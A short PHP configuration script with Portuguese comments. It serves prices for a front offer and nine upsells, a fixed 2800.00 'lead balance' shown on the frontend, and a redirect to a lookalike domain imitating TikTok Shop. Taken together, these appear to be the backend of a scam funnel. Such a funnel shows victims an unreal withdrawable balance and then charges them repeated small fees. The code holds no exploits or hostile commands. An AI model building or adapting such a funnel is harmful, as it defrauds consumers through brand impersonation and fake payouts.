<?php

function central_prices_map() {
    return [
        'front' => 12.97,
        'up1' => 7.20,
        'up2' => 6.47,
        'up3' => 11.88,
        'up4' => 5.70,
        'up5' => 9.30,
        'up6' => 13.43,
        'up7' => 6.80,
        'up8' => 14.73,
        'up9' => 28.55,
    ];
}

function central_amounts_map() {
    return [
        // Valor base de saldo/levantamento do lead no frontend inteiro.
        'lead_balance' => 2800.00,
    ];
}

function central_redirects_map() {
    return [
        // URL de entrada do fluxo de UPs (pode ser externa).
        'up1_entry' => 'https://lojatlktokshop.shop/up1/index.php',
    ];
}

function central_price($key, $fallback = 0.0) {
    $map = central_prices_map();
    if (!array_key_exists($key, $map)) return (float)$fallback;
    return (float)$map[$key];
}

function central_amount($key, $fallback = 0.0) {
    $map = central_amounts_map();
    if (!array_key_exists($key, $map)) return (float)$fallback;
    return (float)$map[$key];
}

function central_redirect($key, $fallback = '') {
    $map = central_redirects_map();
    if (!array_key_exists($key, $map)) return (string)$fallback;
    return (string)$map[$key];
}

if (isset($_GET['format']) && $_GET['format'] === 'js') {
    header('Content-Type: application/javascript; charset=utf-8');
    $json = json_encode(central_prices_map(), JSON_UNESCAPED_UNICODE);
    $jsonAmounts = json_encode(central_amounts_map(), JSON_UNESCAPED_UNICODE);
    $jsonRedirects = json_encode(central_redirects_map(), JSON_UNESCAPED_UNICODE);
    echo ";(function(){";
    echo "var PRICES=" . $json . ";";
    echo "var AMOUNTS=" . $jsonAmounts . ";";
    echo "var REDIRECTS=" . $jsonRedirects . ";";
    echo "window.CENTRAL_PRICES=PRICES;";
    echo "window.CENTRAL_AMOUNTS=AMOUNTS;";
    echo "window.CENTRAL_REDIRECTS=REDIRECTS;";
    echo "window.getCentralPrice=function(key,fallback){";
    echo "if(!Object.prototype.hasOwnProperty.call(PRICES,key)) return fallback;";
    echo "var n=Number(PRICES[key]);";
    echo "return Number.isFinite(n)?n:fallback;";
    echo "};";
    echo "window.getCentralAmount=function(key,fallback){";
    echo "if(!Object.prototype.hasOwnProperty.call(AMOUNTS,key)) return fallback;";
    echo "var n=Number(AMOUNTS[key]);";
    echo "return Number.isFinite(n)?n:fallback;";
    echo "};";
    echo "window.getCentralRedirect=function(key,fallback){";
    echo "if(!Object.prototype.hasOwnProperty.call(REDIRECTS,key)) return fallback;";
    echo "return String(REDIRECTS[key]||fallback||'');";
    echo "};";
    echo "})();";
    exit;
}

